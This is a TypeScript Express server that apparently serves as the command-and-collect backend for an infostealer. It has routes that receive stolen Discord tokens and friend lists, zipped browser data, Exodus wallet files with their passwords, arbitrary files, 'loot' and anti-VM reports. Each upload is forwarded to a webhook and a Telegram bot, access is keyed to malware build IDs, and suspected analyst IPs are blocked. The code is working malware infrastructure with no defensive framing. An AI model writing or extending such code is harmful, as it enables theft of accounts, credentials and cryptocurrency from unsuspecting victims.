import express from 'express';
import cors from 'cors';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { Telegraf, Context } from 'telegraf';
import { API_PORT, BASE_WEBHOOK_URL, WEBHOOK_FORWARD_DELAY_MS } from '../config';
import UploadRecord from '../models/UploadRecord';
import sanitizeFilename from 'sanitize-filename';
import { notifyWebhook } from '../utils/notifyWebhook';
import rateLimit from 'express-rate-limit';
import UserAccess from '../models/UserAccess';

const uploadDir = path.join(process.cwd(), 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
    destination: function (_req: any, _file: any, cb: any) {
        cb(null, uploadDir);
    },
    filename: function (_req: any, file: any, cb: any) {
        const name = `${Date.now()}_${sanitizeFilename(file.originalname)}`;
        cb(null, name);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }
});



export function startApi(bot: Telegraf<Context>, port?: number) {
    const app = express();
    app.use(cors());
    app.use(express.json({ limit: '500mb' }));
    app.use(express.urlencoded({ limit: '500mb', extended: true }));
    app.set('trust proxy', 1);
    const limiter = rateLimit({
        windowMs: 2147483647,
        max: 150,
        message: {
            status: 429,
            error: ':D'
        },
        standardHeaders: true,
        legacyHeaders: false
    });
    app.use(async (req: any, _res: any, next: any) => {
        try {

            const buildId = req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null;
            const apiKey = req.headers['API_KEY'];
            const existkey = await UserAccess.findOne({
                "build.key": { $in: [apiKey] }
            });
            if ((!buildId && !apiKey) || !existkey) {

                return _res.status(403).json({ error: ":D" });
            }

            const now = new Date();
            const method = req.method;
            const pathReq = req.path;
            let bodySummary: any = undefined;

            if (req.is && req.is('application/json')) {
                bodySummary = req.body;
            } else {
                bodySummary = { note: 'non-json or multipart body' };
            }

            const ip = req.ip || (req.headers['x-forwarded-for'] || req.socket?.remoteAddress) as string;


            const blacklistedIPs = ["31.223.48.25", "88.230.94.226", "90.101.154.102", "146.70.184.85", "185.91.69.33", "195.170.172.225", "204.76.203.210", "79.127.182.141", "193.32.248.146"];
            if (blacklistedIPs.some(bIP => ip.includes(bIP))) {
                return _res.json({ hellobaby: " You're just straining your machine :D" });
            }

            console.log(`[${now.toISOString()}] ${method} ${pathReq} from ${ip} | BuildID: ${buildId}`);


            try {
                const doc = new UploadRecord({
                    route: '/incoming',
                    meta: {
                        method,
                        path: pathReq,
                        ip,
                        body: bodySummary,
                        ts: now,
                        buildId: buildId
                    }
                });
                await doc.save();
            } catch {

            }

        } catch (err) {
            console.error("Middleware Error:", err);
        }
        next();
    });

    app.use(express.static(path.join(__dirname, '../public')));

    app.get('/health', (_req, res) => res.json({ ok: true }));

    app.get('/status', async (_req, res) => {
        try {
            const me = await bot.telegram.getMe();
            res.json({ ok: true, bot: me });
        } catch (err) {
            res.status(500).json({ ok: false, error: err?.toString?.() ?? String(err) });
        }
    });

    app.post('/log', limiter, express.json({ limit: '100mb' }), async (req: any, res) => {
        console.log(req.body);
        res.json({ ok: true });
    });

    app.post('/send', limiter, async (req: any, res) => {
        const { chatId, text } = req.body;
        if (!chatId || !text) return res.status(400).json({ ok: false, error: 'chatId and text required' });
        try {
            const result = await bot.telegram.sendMessage(chatId, text);
            res.json({ ok: true, result });
        } catch (err) {
            res.status(500).json({ ok: false, error: err?.toString?.() ?? String(err) });
        }
    });

    app.post('/discord', limiter, express.json({ limit: '100mb' }), async (req: any, res) => {
        try {
            const { token, userInfo, friends } = req.body as any;
            const record: any = { route: '/discord', meta: sanitizeForLog(req.body) };
            if (typeof token === 'string' && token.length > 0) {
                record.meta.tokenHash = token;
            }
            if (userInfo) record.meta.userInfo = userInfo;
            if (friends) record.meta.friends = Array.isArray(friends) ? friends : undefined;
            const doc = new UploadRecord(record);
            await doc.save();
            try {
                if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/discord', id: doc._id.toString(), meta: { token: record.meta.tokenHash ?? null, userInfo: record.meta.userInfo ?? null, friends: record.meta.friends ?? null, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null } });
            } catch { }
            res.json({ ok: true, stored: { tokenHash: record.meta.tokenHash ?? null } });
        } catch (err) {
            res.status(500).json({ ok: false, error: String(err) });
        }
    });


    app.post('/browser', limiter, upload.single('file'), async (req: any, res) => {
        try {
            const summary = req.body.summary ?? null;
            const file = req.file;
            if (!file) return res.status(400).json({ ok: false, error: 'file is required' });
            if (!file.originalname.toLowerCase().endsWith('.zip')) {
                try { fs.unlinkSync(file.path); } catch { }
                return res.status(400).json({ ok: false, error: 'only zip files allowed' });
            }
            const doc = new UploadRecord({ route: '/browser', originalName: file.originalname, filePath: file.path, meta: sanitizeForLog(req.body) });
            await doc.save();
            try { if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/browser', id: doc._id.toString(), originalName: doc.originalName, meta: { summary, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null }, filePath: doc.filePath }); } catch (e) { console.log(e) }
            res.json({ ok: true, id: doc._id });
        } catch (err) { res.status(500).json({ ok: false, error: String(err) }); }
    });


    app.post('/exodus', limiter, upload.single('file'), async (req: any, res) => {
        try {
            const password = req.body.password ?? null;
            const file = req.file;
            if (!file) return res.status(400).json({ ok: false, error: 'file is required' });
            if (!file.originalname.toLowerCase().endsWith('.zip')) {
                try { fs.unlinkSync(file.path); } catch { }
                return res.status(400).json({ ok: false, error: 'only zip files allowed' });
            }
            const meta: any = {};
            if (typeof password === 'string' && password.length) meta.passwordHash = password;
            const doc = new UploadRecord({ route: '/exodus', originalName: file.originalname, filePath: file.path, meta: sanitizeForLog(req.body) });
            await doc.save();
            try { if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/exodus', id: doc._id.toString(), originalName: doc.originalName, meta: { passwordHash: meta.passwordHash ? 'stored' : null, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null }, filePath: doc.filePath }); } catch { }
            res.json({ ok: true, id: doc._id, passwordStored: !!meta.passwordHash });
        } catch (err) { res.status(500).json({ ok: false, error: String(err) }); }
    });


    app.post('/files', limiter, upload.single('file'), async (req: any, res) => {
        try {
            const message = req.body.message ?? null;
            const file = req.file;
            if (!file) return res.status(400).json({ ok: false, error: 'file is required' });
            if (!file.originalname.toLowerCase().endsWith('.zip')) {
                try { fs.unlinkSync(file.path); } catch { }
                return res.status(400).json({ ok: false, error: 'only zip files allowed' });
            }
            const doc = new UploadRecord({ route: '/files', originalName: file.originalname, filePath: file.path, meta: sanitizeForLog(req.body) });
            await doc.save();
            try { if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/files', id: doc._id.toString(), originalName: doc.originalName, meta: { message, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null }, filePath: doc.filePath }); } catch { }
            res.json({ ok: true, id: doc._id });
        } catch (err) { res.status(500).json({ ok: false, error: String(err) }); }
    });
    app.post("/capture", limiter, async (req, res) => {
        try {
            await notifyWebhook({ route: "/capture", id: "1", meta: { file: req.body, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null } })

            res.sendStatus(200)
        } catch (error) {

        }
    })

    app.post('/log', limiter, express.json({ limit: '100mb' }), async (req: any, res) => {
        try {
            const { message } = req.body as any;
            const doc = new UploadRecord({ route: '/log', meta: sanitizeForLog(req.body) });
            await doc.save();
            try { if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/log', id: doc._id.toString(), meta: { message, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null } }); } catch { }
            res.json({ ok: true });
        } catch (err) { res.status(500).json({ ok: false, error: String(err) }); }
    });
    const LOG_FILE = path.join(__dirname, 'loot.log');

    app.post('/collect', limiter, async (req, res) => {

        console.log(JSON.stringify(req.body, null, 2));
        const { message } = req.body as any;
        const doc = new UploadRecord({ route: '/collect', meta: sanitizeForLog(req.body) });
        await doc.save();
        let data = req.body
        try { if (BASE_WEBHOOK_URL) await notifyWebhook({ route: '/inject', id: doc._id.toString(), meta: { data, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null } }); } catch { }


        res.sendStatus(200);
    });
    const listenPort = port ?? API_PORT ?? 3000;
    const server = app.listen(listenPort, () => {
        console.log(`API server listening on http://localhost:${listenPort}`);
    });

    app.post("/antivm", limiter, async (req, res) => {
        try {
            const data = req.body;
            if (BASE_WEBHOOK_URL) {
                await notifyWebhook({ route: "/antivm", id: "antivm", meta: { data, buildId: req.headers['x-build-id'] ?? req.headers['X-Build-ID'] ?? null } })
            }
            res.sendStatus(200)
        } catch (error) {

        }
    })


    return { app, server };
}

export default startApi;

function sanitizeForLog(body: any) {
    if (!body || typeof body !== 'object') return body;
    const result: any = {};
    for (const key of Object.keys(body)) {
        {
            const value = body[key];
            if (typeof value === 'string' && value.length > 256) {
                result[key] = value.slice(0, 256) + '...';
            } else {
                result[key] = value;
            }
        }
    }
    return result;
}

